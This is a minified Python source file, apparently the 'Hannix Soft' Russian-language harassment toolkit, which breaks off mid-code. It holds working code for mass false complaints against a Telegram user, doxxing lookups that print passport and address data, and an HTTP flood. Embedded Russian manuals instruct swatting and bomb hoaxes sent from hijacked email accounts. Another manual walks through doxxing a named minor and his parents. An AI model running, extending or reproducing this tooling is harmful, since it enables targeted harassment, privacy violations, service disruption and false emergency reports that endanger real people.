_E='results'
_D='utf-8'
_C=True
_B='country'
_A='phone'
import json,os
os.system('pip install pytest-shutil bs4 fuzzywuzzy pyfiglet pystyle faker phonenumbers requests whois python-whois py-whois pywhois pythonwhois colorama fake-useragent Threaded beautifulsoup4')
import colorama,requests,phonenumbers,platform,csv,re,pystyle,socket,threading,datetime,time,string,faker,bs4,urllib.parse,colorama,concurrent.futures,random,datetime,platform,whois,threading,time,hashlib,pyfiglet,smtplib,sys,bs4,smtplib as smtp,time,fake_useragent,functools,csv,glob
from keyauth import api
import phonenumbers,phonenumbers.timezone,phonenumbers.carrier,phonenumbers.geocoder
from fake_useragent import UserAgent
from datetime import datetime,timezone
from getpass import getpass
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pyfiglet import Figlet
from pystyle import Colors,Box,Write,Center,Colorate,Anime
from fuzzywuzzy import process,fuzz
from phonenumbers import geocoder,carrier,timezone
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from colorama import init,Fore,Back,Style
from datetime import datetime,timedelta
from httpweb_number import HttpWebNumber
os.system('clear')
violations={1:['Спам',['Уважаемая служба поддержки, обращаем ваше внимание на активности пользователя {username}, который рассылает большое количество нежелательной рекламы и сообщений в чатах и группах Telegram. Просим принять меры по прекращению данного спама.','Пользователь {username} активно злоупотребляет рассылкой спама, что нарушает вежливость и правила пользования платформой Telegram. Пожалуста, проверьте и примите соответствующие меры.']],2:['Мошенничество',['Уважаемая служба поддержки, прошу обратить внимание на аккаунт пользователя {username}, который предлагает участие в потенциально мошеннических схемах. Данное поведение вызывает сомнения и требует проверки.','Пользователь {username} может быть причастен к мошенническим действиям, стоит рассмотреть поведение и действия данного аккаунта более детально.']],3:['Порнография',['Уважаемая служба поддержки, являюсь пользователем Telegram и заметил нарушения в контенте аккаунта {username}, который содержит порнографический материал. Прошу принять меры по удалению данного контента и привлечению пользователя к ответственности.','Пользователь {username} активно распространяет материалы для взрослых, что противоречит правилам и целям Telegram как безопасного мессенджера.']],4:['Нарушение правил',['Уважаемая служба поддержки, обращаем ваше внимание на абонента {username}, который систематически нарушает правила платформы Telegram. Просим принять меры в отношении данного пользователя, чтобы обеспечить соблюдение правил сообщества.','Личность {username} провоцирует конфликты и размещает недопустимый контент в чатах и каналах Telegram, что недопустимо и требует вмешательства. Просим проверить и принять соответствующие меры.']]}
phone_numbers_templates=['+7917**11**2','+7926**386**','+7952**99*63','+7903**76*82','+7914**237*7*','+7937**61***','+7978**42***','+7982**89***','+7921**57***','+7991**34***','+7910**68***','+7940**15***','+7961**72***','+7985**49***','+7951**27***','+7916**83***','+7932**95***','+7975**44***','+7989**78***','+7993**64***','+7923**58***','+7970**30***','+7960**17***','+7995**48***','+7953**25***','+7919**77***','+7938**36***','+7986**62***','+7907**81*7*','+7947**53*6*','+7971**29***','+79884250505','+7981**29***','+7901**25***','+7961**22***','+7941**20***','+7931**26***','+7921**27***','+7901**29***']
API='https://www.1secmail.com/api/v1/'
domainList=['1secmail.com','1secmail.net','1secmail.org']
domain=random.choice(domainList)
def get_mtproto_proxies(api_url):
	'\n    Получение списка MTProto прокси из API.\n    :param api_url: URL API\n    :return: Список прокси\n    '
	try:B=requests.get(api_url);B.raise_for_status();A=B.json();return A if isinstance(A,list)else[A]
	except requests.exceptions.RequestException as C:Write.Print(f"      Ошибка при запросе данных: {C}",Colors.red);return[]
def display_mtproto_proxy(proxy):'\n    Вывод информации о MTProto прокси.\n    ';A=proxy;Write.Print('      MTProto Proxy:\n\n',Colors.red_to_purple);Write.Print(f"      Host: {A.get('host')}\n",Colors.red_to_purple);Write.Print(f"      Port: {A.get('port')}\n",Colors.red_to_purple);Write.Print(f"      Secret: {A.get('secret')}\n",Colors.red_to_purple);Write.Print(f"      Country: {A.get(_B)}\n",Colors.red_to_purple);Write.Print(f"      Ping: {A.get('ping')} ms\n\n",Colors.red_to_purple);Write.Print('-'*50,Colors.red_to_purple)
def search_in_file(filename,search_value,encoding=_D,threshold=99,scorer=fuzz.partial_ratio):
	'\n    Выполняет поиск в указанном файле.\n    ';C=None;B=False;A=filename
	try:
		with open(A,'r',encoding=encoding)as F:
			G=csv.reader(F)
			for D in G:
				if D:
					E=process.extractOne(search_value,D,scorer=scorer)
					if E and E[1]>=threshold:return _C,D
			return B,C
	except FileNotFoundError:Write.Print(f"      Файл {A} не найден !",Colors.red_to_purple);return B,C
	except UnicodeDecodeError:Write.Print(f"      Ошибка декодирования файла {A}. Попробуйте другую кодировку.",Colors.red_to_purple);return B,C
	except Exception as H:Write.Print(f"      Ошибка при обработке файла {A}: {H}",Colors.red_to_purple);return B,C
def search_data(search_value,filenames,encoding=_D,threshold=99,scorer=fuzz.partial_ratio):
	print('');B=[]
	for A in filenames:
		D,C=search_in_file(A,search_value,encoding,threshold,scorer)
		if D:B.append((A,C))
	if B:
		Write.Print('      Найденные совпадения:\n\n',Colors.red_to_purple)
		for(A,C)in B:Write.Print(f"      БД: {A}\n      Данные: {C}",Colors.red_to_purple)
	else:Write.Print('      Ошибка: Совпадений не найдено !',Colors.red_to_purple)
def generateUserName():A=string.ascii_lowercase+string.digits;B=''.join(random.choice(A)for B in range(10));return B
def fetch_data(responser):
	try:A=requests.get(f"https://reveng.ee/api/search?q={responser}");A.raise_for_status();return A.json()
	except requests.exceptions.RequestException as B:print('');Write.Print(f"      Ошибка при запросе к API: {B}",Colors.red);return
def display_results(results):
	X='INN';W='Type';V='Document number';U='Asset';T='Ownership';S='Full address';R='City';Q='Street address';P='User account';O='citizenship';N='passportNumber';M='education';L='position';K='addressEntity';J='address';I='email';H='birthDate';G='fatherName';F='lastName';E='firstName';C='name';B=', '
	for D in results.get(_E,[]):
		A=D.get('properties',{});Y=D.get('source',[]);Z=B.join(A[C]for A in Y);print('')
		if A.get(C):Write.Print(f"      ├ Полное Имя: {B.join(A[C])}\n",Colors.red_to_purple)
		if A.get(E):Write.Print(f"      ├ Имя: {B.join(A[E])}\n",Colors.red_to_purple)
		if A.get(F):Write.Print(f"      ├ Фамилия: {B.join(A[F])}\n",Colors.red_to_purple)
		if A.get(G):Write.Print(f"      ├ Отчество: {B.join(A[G])}\n",Colors.red_to_purple)
		if A.get(H):Write.Print(f"      ├ Дата рождения: {B.join(A[H])}\n",Colors.red_to_purple)
		if A.get(_B):Write.Print(f"      ├ Страна: {B.join(A[_B])}\n",Colors.red_to_purple)
		if A.get(I):Write.Print(f"      ├ Почта: {B.join(A[I])}\n",Colors.red_to_purple)
		if A.get(_A):Write.Print(f"      ├ Телефон: {B.join(A[_A])}\n",Colors.red_to_purple)
		if A.get(J):Write.Print(f"      ├ Адрес: {B.join(A[J])}\n",Colors.red_to_purple)
		if A.get(K):Write.Print(f"      ├ Адресная сущность: {B.join(A[K])}\n",Colors.red_to_purple)
		if A.get(L):Write.Print(f"      ├ Должность: {B.join(A[L])}\n",Colors.red_to_purple)
		if A.get(M):Write.Print(f"      ├ Образование: {B.join(A[M])}\n",Colors.red_to_purple)
		if A.get(N):Write.Print(f"      ├ Номер паспорта: {B.join(A[N])}\n",Colors.red_to_purple)
		if A.get(O):Write.Print(f"      ├ Гражданство: {B.join(A[O])}\n",Colors.red_to_purple)
		if A.get(P):Write.Print(f"      ├ Учетная запись пользователя: {B.join(A[P])}\n",Colors.red_to_purple)
		if A.get(Q):Write.Print(f"      ├ Улица: {B.join(A[Q])}\n",Colors.red_to_purple)
		if A.get(R):Write.Print(f"      ├ Город: {B.join(A[R])}\n",Colors.red_to_purple)
		if A.get(S):Write.Print(f"      ├ Полный адрес: {B.join(A[S])}\n",Colors.red_to_purple)
		if A.get(T):Write.Print(f"      ├ Владение: {B.join(A[T])}\n",Colors.red_to_purple)
		if A.get(U):Write.Print(f"      ├ Актив: {B.join(A[U])}\n",Colors.red_to_purple)
		if A.get(V):Write.Print(f"      ├ Номер документа: {B.join(A[V])}\n",Colors.red_to_purple)
		if A.get(W):Write.Print(f"      ├ Тип: {B.join(A[W])}\n",Colors.red_to_purple)
		if A.get(X):Write.Print(f"      ├ ИНН: {B.join(A[X])}\n",Colors.red_to_purple)
def getchecksum():A=hashlib.md5();B=open(''.join(sys.argv),'rb');A.update(B.read());C=A.hexdigest();return C
keyauthapp=api(name='Hannix',ownerid='lansb5R41v',secret='86f2ca672a473fc452f38291a39bec40f95a1ebadf82acb1b0ac45112f3e02f1',version='1.0',hash_to_check=getchecksum())
print('')
key=input(Fore.MAGENTA+'   🔑 Введите ключ, который вам выдали: ')
keyauthapp.license(key)
os.system('clear')
def logo():B=255,0,0;C=0,0,255;A='\n\n                \n██╗░░██╗░█████╗░███╗░░██╗███╗░░██╗██╗██╗░░██╗\u2003 \u2003░██████╗░█████╗░███████╗████████╗\n██║░░██║██╔══██╗████╗░██║████╗░██║██║╚██╗██╔╝\u2003 \u2003██╔════╝██╔══██╗██╔════╝╚══██╔══╝\n███████║███████║██╔██╗██║██╔██╗██║██║░╚███╔╝░\u2003 \u2003╚█████╗░██║░░██║█████╗░░░░░██║░░░\n██╔══██║██╔══██║██║╚████║██║╚████║██║░██╔██╗░\u2003 \u2003░╚═══██╗██║░░██║██╔══╝░░░░░██║░░░\n██║░░██║██║░░██║██║░╚███║██║░╚███║██║██╔╝╚██╗\u2003 \u2003██████╔╝╚█████╔╝██║░░░░░░░░██║░░░\n╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═╝░░╚══╝╚═╝╚═╝░░╚═╝\u2003 \u2003╚═════╝░░╚════╝░╚═╝░░░░░░░░╚═╝░░░\n\n               ╔═══════════════════════════════════════════════════╗               \n               ║   Telegram: @HannixSoft           Version: 2.00   ║\n               ╚═══════════════════════════════════════════════════╝\n';Write.Print(Center.XCenter(A),Colors.red_to_purple,interval=.001)
def menu():A='\n╭─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╮\n│ [01] Снос Тelegram                           │ [06] Мануал по Dox                            │ [11] Пробив по Mac-Addres    │\n│ [02] Пробив по IP                            │ [07] DDoS Атака                               │ [12] Пробив по портам        │\n│ [03] Пробив по номеру                        │ [08] Web Crawler                              │ [13] Снос Сессий (ТГ)        │\n│ [04] Мануал по анонимности                   │ [09] Прокси                                   │ [26] Информация              │\n│ [05] Мануал по Swat                          │ [10] Генератор личностей                      │ [26] Информация              │\n│─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────│\n│ [14] Пробив по БД                            │ [19] Виртуальные номера                       │ [24] Абузы для ворка         │\n│ [15] Анонимные VPN                           │ [20] Физ симки                                │ [25] IP Logger               │ \n│ [16] Анонимные Proxy                         │ [21] Тексты для Swat                          │ [26] Информация              │\n│ [17] Мануал по анонимности                   │ [22] Сделать текст для Swat                   │ [27] Поиск в интернете       │\n│ [18] Виртуальный E-mail                      │ [23] Темки для ворка                          │ [28] Получить ключи Mullvad  │\n│─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────│\n│ [29] Генерация QR-кодов                      │ [34] Получить прокси                          │ [38] Генератор почты         │            \n│ [30] OSINT                                   │ [35] Генерация UUID                           │ [39] Сканирование поддоменов │\n│ [31] Поиск по VK                             │ [36] Генерация SS                             │ [40] Пробив по Telegram      │\n│ [32] Поиск по ссылке                         │ [37] Генерация MAC                            │ [41] Поиск по номеру         │\n│ [33] Фишинг                                  │ [37] Генерация MAC                            │ [42] Поиск по датам          │\n╰─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╯';print('');Write.Print(Center.XCenter(A),Colors.red_to_purple,interval=.001);print('');print('');B=input(Fore.GREEN+'      | Выберите пункт | ➞ ');return B
def main():
	A1='      Временно недоступно !';A0='      Raw: ';z='127.0.0.1';y='Mozilla/5.0 (X11; Linux x86_64; rv:69.0) Gecko/6917 Firefox/69.0';x='Mozilla/5.0 (X11; Linux x86_64; rv:83.0) Gecko/8310 Firefox/83.0';w='Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:66.0) Gecko/6612 Firefox/66.0';v='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/7620 Firefox/76.0';u='Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:86.0) Gecko/8615 Firefox/86.0';t='Mozilla/5.0 (Linux; Android 12; JLN-LX1; HMSCore 6.13.0.322) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.1.2.322 Mobile Safari/537.36';i='      \n\nНажмите Enter для возврата в меню';h='      Нет указанной фразы !\n';g='\n';f='Mozilla/5.0 (X11; Linux x86_64; rv:75.0) Gecko/7521 Firefox/75.0';Z='Ж';Y='М';X='Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)';W='Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)';V='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36';U='Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36';T='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36';L='https://oauth.telegram.org/auth/login?bot_id=547043436&origin=https%3A%2F%2Fcore.telegram.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcore.telegram.org%2Fwidgets%2Flogin, ';K='https://oauth.telegram.org/auth/login?bot_id=366357143&origin=https%3A%2F%2Fwww.botobot.ru&embed=1&request_access=write&lang=ru&return_to=https%3A%2F%2Fwww.botobot.ru%2F, ';J='https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1';I='https://translations.telegram.org/auth/request';H='https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin';E='https://oauth.telegram.org/auth/login?bot_id=7131017560&origin=https%3A%2F%2Flolz.live%2F, ';logo();C=menu()
	if C=='01':
		def A2(username,violation):A=random.choice(violations[violation][1]).format(username=username);return A
		def A3(complaint,phone_number):
			A='https://telegram.org/support';B={'content-type':'application/json'};C={'complaint':complaint,'phone_number':phone_number}
			try:
				D=requests.post(A,headers=B,json=C)
				if D.status_code==200:print('');pystyle.Write.Print(f"      ✅ Жалоба на {j} успешно отправлена !",pystyle.Colors.green)
				else:pystyle.Write.Print('      ⚠️ Ошибка при отправке !',pystyle.Colors.yellow)
			except:pystyle.Write.Print('      ❌ Cбой при отправке !',pystyle.Colors.red)
		print('');j=input(Fore.YELLOW+'      Введите юзернейм пользователя: ');print('');print('      [01] Cнос за спам',pystyle.Colors.red);print('      [02] Cнос за скам',pystyle.Colors.red);print('      [03] Cнос за порно',pystyle.Colors.red);print('      [04] Cнос за нарушение',pystyle.Colors.red);print('');A4=int(input('      | Выберите причину сноса | ➞ '));A5=int(input(Fore.MAGENTA+'      Введите количество жалоб для отправки: '));k=[]
		for A6 in random.choices(phone_numbers_templates,k=A5):Q=''.join(random.choice('0123456789')if A=='*'else A for A in A6);k.append(Q)
		print('');pystyle.Write.Print(Fore.GREEN+'      Начинаю отправку жалоб...',pystyle.Colors.blue)
		for Q in k:A7=A2(j,A4);A3(A7,Q);time.sleep(.5)
		logo();main()
	elif C=='02':print('');A8=input('      \x1b[95mВведите IP адрес: \x1b[0m');F=requests.get(f"http://ip-api.com/json/{A8}").json();print('');print('');print(Fore.BLUE+'      IP: '+F['query']);print(Fore.BLUE+'      Status: '+F['status']);print(Fore.BLUE+'      Country: '+F[_B]);print(Fore.BLUE+'      Country Code: '+F['countryCode']);print(Fore.BLUE+'      Region: '+F['region']);print(Fore.BLUE+'      Region Name: '+F['regionName']);print(Fore.BLUE+'      City: '+F['city']);print(Fore.BLUE+'      ZIP: '+F['zip']);print(Fore.BLUE+'      Lat: '+str(F['lat']));print(Fore.BLUE+'      Lon: '+str(F['lon']));print(Fore.BLUE+'      Timezone: '+F['timezone']);print(Fore.BLUE+'      ISP: '+F['isp']);print(Fore.BLUE+'      ORG: '+F['org']);print(Fore.BLUE+'      AS: '+F['as']);logo();main()
	elif C=='03':A9=HttpWebNumber();A9.print_number_results;time.sleep(3);print('');print(Fore.RED+'       DOX BY HANNIX SOFT');logo();main()
	elif C=='04':print('');pystyle.Write.Print('\nРуководство по обеспечению анонимности\n\n        [Доксинг]\n\n        При вступлении в сообщество обезличивания, необходимо осознать дополнительные риски, поскольку следует помнить: найдется человек, способный разоблачить вас в кратчайшие сроки.\n\n        Анонимность в Telegram - базовый уровень. Она включает использование виртуальных номеров, однако стоит помнить, что эта услуга не обеспечит полной защиты из-за возможности сохранения логов. Поэтому рекомендуется искать поставщиков услуг с активными номерами и фальшивой информацией. Например, пользователя по имени "смолин" либо тех, кто рекламирует подобные услуги на своем телеграм-канале.\n\n        Этот раздел ориентирован на русскоязычных пользователей. Для украинцев проще: достаточно приобрести сим-карту Vodafone и зарегистрировать на нее исключительно аккаунт в Telegram.\n\n        Затем необходимо удалить свои данные из "глаза бога". Думаю, многие знакомы с этой процедурой. Но зачем она, если у вас чистый или виртуальный номер? Личность может начать поиски, уверенная, что ваш аккаунт содержит достоверную информацию. Это усложняет ее задачу при использовании популярных ботов для извлечения номеров, таких как Quick Osint, BlackatSearch, GTA, SmartSearch.\n\n        Кроме того, стоит учитывать следующие пять простых правил:\n\n        1. НИКОГДА не разглашайте личную информацию, используйте чужие имя, возраст, страну и город проживания, никаких подробностей.\n        2. НИКОГДА не передавайте свой номер телефона, даже если он чистый или виртуальный. Не отправляйте его ботам, включая "глаз бога". Многие боты могут использовать скрипты деанонимизации, запрашивая ваш контакт.\n        3. При покупке подписки в "глазе бога" используйте временную почту, например, через сервис TempMail, чтобы избежать утечки вашей почты.\n        4. Не используйте одинаковые имена пользователей для своих аккаунтов.\n        5. Используйте прокси. Некоторые участники сообщества создают сайты с IP-логгерами. Для предотвращения утечки местоположения и IP-адреса настройте прокси-сервер в Telegram и открывайте ссылки прямо в приложении Telegram или используйте VPN, если не уверены в настройках.\n\n        Анонимность в Telegram - это основа. Но что делать вне Telegram? Кроме Telegram существуют сообщества в VKontakte и Discord. Как обезопасить себя? Избегайте русскоязычные социальные сети и сервисы, так как они также могут подвергать вас риску утечки данных. VKontakte является одной из наименее безопасных социальных сетей. Рекомендуется удалить все свои личные аккаунты и отписаться от групп, связанных с родственниками, друзьями, школами или городами. Это не относится к Telegram. Очищайте аккаунты и затем удаляйте их.\n\n        [Swatting]\n\n        Анонимность в этом случае базируется на четырех основных компонентах: прокси-сервере, VPN, Tor-браузере и Linux.\n\n        Настройку Tor и Linux для анонимности можно найти на YouTube, так как это не секрет и в сети много подобных видеороликов.\n        VPN. Я лично использую Nord и Mullvad для сваттинга или лжеминирования. Важно использовать сразу два VPN для лучшей анонимности.\n        Прокси. Не используйте бесплатные прокси-сервера, купите платные, чтобы обеспечить полную безопасность.\n\n        Кроме того, для окончательной безопасности в сети при сваттинге или лжеминировании используйте не свой домашний Wi-Fi или мобильный интернет. Рекомендуется подключаться к бесплатной сети в кафе и использовать ее для незаконных действий.\n\n        !! ВАЖНО !!\n\n        При сваттинге или лжеминировании НИ ПО КАКИМ ОБСТОЯТЕЛЬСТВАМ НЕ ПОСЕЩАЙТЕ САЙТЫ, НА КОТОРЫХ МОЖЕТ БЫТЬ ВАША ЛИЧНАЯ ИНФОРМАЦИЯ. Включайте VPN только при регистрации почты для отправки писем, а затем отключайте его.\n\n        Отправили письмо - следуйте этим же шагам в правильной последовательности. Выйдите из Tor, Linux, а затем из VPN.\n',pystyle.Colors.green,interval=.005);logo();main()
	elif C=='05':print('');pystyle.Write.Print('\nДля начала требуется получить доступ к почтовым аккаунтам на mail.ru и proton.mail через соответствующие веб-сайты от имени жертвы. Подробности о процессе не требуются.\n\n        После завершения этого шага переходим в мессенджер Telegram и приобретаем виртуальные номера для protonMail или Mail.ru. Рекомендуемые боты, не склонные к утечке введенной информации и SMS, включают в себя @GreedySMSbot и @SMSBest_bot.\n\n        Затем, после приобретения виртуального номера, необходим хороший платный VPN и прокси. Рекомендуется использовать Mullvad VPN как наиболее надежный\n\n        После покупки виртуального номера для почты следует написать текст, который не попадет в спам. Лучше всего сформулировать его как руководство по "Swatting". Ниже представлен список инструментов, необходимых для успешной операции:\n\n        1. Операционная система Android.\n        2. Почтовый сервис Proton Mail.\n        3. Комбинация мультихоп VPN: Proton VPN и MullVad VPN.\n        4. Tor Browser с соответствующими плагинами или Firefox с плагинами.\n\n        Мультихоп представляет собой использование двух и более VPN одновременно на устройстве.\n\n        Шаги для подготовки:\n\n        1. Создание нового почтового ящика на Proton Mail.\n        2. Загрузка виртуальной машины на телефон.\n        3. Установка еще одной виртуальной машины внутри первой.\n        4. Загрузка MullVad VPN на телефон без виртуальной машины.\n        5. Установка того же VPN на первой виртуальной машине с выбором другого региона.\n        6. Загрузка Proton VPN на второй виртуальной машине.\n        7. Загрузка Tor Browser или Firefox с плагинами на последнюю виртуальную машину.\n        8. Посещение сайта Proton Mail для более безопасного использования.\n        9. Настройка браузера Firefox внутри виртуальной машины для обеспечения улучшенной защиты от отслеживания и удаления куки-файлов.\n\n        Для отправки электронной почты через Proton Mail рекомендуется включить антифрод (цензурирование определенных слов в письме).\n\n        После составления письма, которое будет привлекательным для получателя, рекомендуется отправить его не менее чем на 20 адресов электронной почты. Обязательно укажите контактные данные жертвы, такие как ФИО и номер телефона или карты.\n\n        Следите за временем и местоположением жертвы, избегайте отправки писем в неподходящее время, чтобы добиться наилучших результатов. При желании можно представляться любым человеком и заминировать любое здание. Указание контактных данных увеличит вероятность заинтересованности получателя.\n',pystyle.Colors.green,interval=.005);logo();main()
	elif C=='06':print('');pystyle.Write.Print('\nВ этом руководстве я подробно опишу, как найти практически любого человека, который не обеспечен должным уровнем защиты в интернете. Этот метод будет полезен для новичков, хотя профессионалы могут найти его недостаточно сложным. Руководство будет основано на легком, но эффективном проникновении через ботов, ссылки на которых я предоставлю в самом низу.\n\n        Итак, приступим. У нас есть аккаунт в Telegram - это все, что нам нужно. Основная цель - получить номер телефона или хотя бы имя и область/город. Как мы это делаем? В Telegram существуют боты-сервисы, способные предоставить вам номер телефона практически любого аккаунта в этой платформе. Вот список таких ботов:\n\n        1. Глаз Бога\n        2. Quick Osint\n        3. GtaSearch\n        4. BlackatSearch\n        5. Криптоскан\n        6. Telegram Analyst\n        7. Leak Osint \n\n        Получили номер. Затем используем сочетание трех ботов - Универсал, Глаз Бога и Юзерсбокс. Заходим в Глаз Бога и начинаем поиск...\n\n        Теперь у нас есть два варианта развития событий, и я рассмотрю наиболее сложный.\n\n        Допустим, мы нашли только регион проживания жертвы, страну, имя и фамилию. Что дальше? Перепроверяем, используя Универсал, который предоставляет информацию о социальных сетях, зарегистрированных на этот номер телефона. Мы убеждаемся в правильности фамилии и имени, а иногда даже отчества.\n\n        Так. Мы получили правдоподобную информацию, включающую имя, фамилию и регион жертвы. Мы вводим эти данные в Юзерсбокс и ищем. Получаем результаты, включающие либо саму жертву, либо список людей с подобными данными. Как найти нужного? Ориентируемся на возраст и адрес. Затем снова обращаемся к Универсалу и проверяем результаты, ища подтверждение в виде даты рождения или города. Нашли. Получаем следующие данные:\n\n        Зузурин Михаил, 12.12.2008, Краснодарский край.\n\n        Вводим их также в Юзерсбокс и ищем, находим номер или несколько, просматриваем их и собираем информацию. Затем проверяем ФИО + дату рождения в Глазе Бога, где находим еще больше информации и добавляем ее в текстовый файл, придавая всему свой стиль.\n\n        Теперь, допустим, вы нашли саму жертву, но нужно найти его родителей? Не проблема. В процессе поиска жертвы мы однозначно получили часть данных о ее отце. Что у нас есть:\n\n        Зузурин Михаил Александрович, 12.12.2008, Краснодарский край.\n\n        Что мы делаем? Ищем: Зузурин Александр, Краснодар. Далее все просто. Мы ищем и сверяем адрес с ранее найденным, также учитываем возраст. Отлично, Шерлок! Вы нашли отца. Зузурин Александр Николаевич, 15.04.1976. Проверяем ФИО и дату рождения в Юзерсбоксе и Глазе Бога, получаем результаты, пробивая их также по номеру.\n\n        Как найти мать? На основе найденной информации об отце мы получаем его номер, на который однозначно зарегистрирована какая-то социальная сеть. Достаем любую фотографию и отправляем ее в Глаз Бога в поисках VKонтakte. Мы находим профиль отца, где либо в подписках будет его жена, либо ее можно увидеть на аватарке. Затем проверяем либо найденный VK, либо фотографию жены, и снова пробиваем VK.\n\n        Как достать номер из VKонтakte? Существует три бота, которые могут это сделать:\n\n        1. VKHistory\n        2. Глаз Бога\n        3. Юзерсбокс\n\n        Ой, проблема. Нигде не удалось найти номер. Что делать? В профиле жены в VK указаны имя, фамилия, дата рождения, а также известен город проживания. Мы вводим эти данные в Юзерсбокс и ищем:\n\n        Зузурина Мария, 24.05.1978, Краснодар.\n\n        Находим информацию, начинаем проверять по номеру и записываем результаты.\n\n        Готово! Написано досье на жертву и ее родителей исключительно с использованием ботов в Telegram. Поздравляю!\n',pystyle.Colors.green,interval=.005);logo();main()
	elif C=='07':
		print('');AA=pystyle.Write.Input('      Введите ссылку на сайт: ',pystyle.Colors.red,interval=.005);print('');AB=int(pystyle.Write.Input('      Введите количество запросов: ',pystyle.Colors.red,interval=.005));AC=[T,U,V,W,X,T,U,V,W,X,T,U,V,W,X,T,U,V,W,X,'Mozilla/5.0 (platform; rv:geckoversion) Gecko/geckotrail Firefox/firefoxversion','Mozilla/5.0 (Macintosh; Intel Mac OS X x.y; rv:42.0) Gecko/20100101 Firefox/42.0','Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0','Mozilla/5.0 (Linux; Android 12; JLN-LX1 Build/HUAWEIJLN-LX1; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36 EdgA/119.0.0.0',t,t,'Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/6710 Firefox/67.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/7421 Firefox/74.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/7717 Firefox/77.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.61; rv:15.0) Gecko/201506 Firefox/15.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/7516 Firefox/75.0','Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:62.0) Gecko/6214 Firefox/62.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/7521 Firefox/75.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.79; rv:12.0) Gecko/201202 Firefox/12.0',u,'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.87; rv:20.0) Gecko/202009 Firefox/20.0','Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/7717 Firefox/77.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.62; rv:10.0) Gecko/201004 Firefox/10.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.70; rv:21.0) Gecko/202105 Firefox/21.0','Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/8918 Firefox/89.0','Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/6115 Firefox/61.0',f,'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.65; rv:14.0) Gecko/201407 Firefox/14.0','Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:87.0) Gecko/8719 Firefox/87.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.67; rv:20.0) Gecko/202008 Firefox/20.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/7515 Firefox/75.0','Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:62.0) Gecko/6211 Firefox/62.0',u,v,f,f,'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.82; rv:17.0) Gecko/201712 Firefox/17.0',v,w,'Mozilla/5.0 (X11; Linux x86_64; rv:85.0) Gecko/8515 Firefox/85.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.76; rv:18.0) Gecko/201804 Firefox/18.0',w,'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:80.0) Gecko/8011 Firefox/80.0','Mozilla/5.0 (X11; Linux x86_64; rv:88.0) Gecko/8818 Firefox/88.0','Mozilla/5.0 (X11; Linux x86_64; rv:88.0) Gecko/8814 Firefox/88.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/8618 Firefox/86.0','Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/6317 Firefox/63.0','Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:84.0) Gecko/8418 Firefox/84.0','Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:61.0) Gecko/6111 Firefox/61.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.64; rv:11.0) Gecko/201101 Firefox/11.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.68; rv:11.0) Gecko/201104 Firefox/11.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/8612 Firefox/86.0','Mozilla/5.0 (Macintosh; Intel Mac OS X 10.79; rv:10.0) Gecko/201007 Firefox/10.0','Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/6915 Firefox/69.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/8117 Firefox/81.0','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) 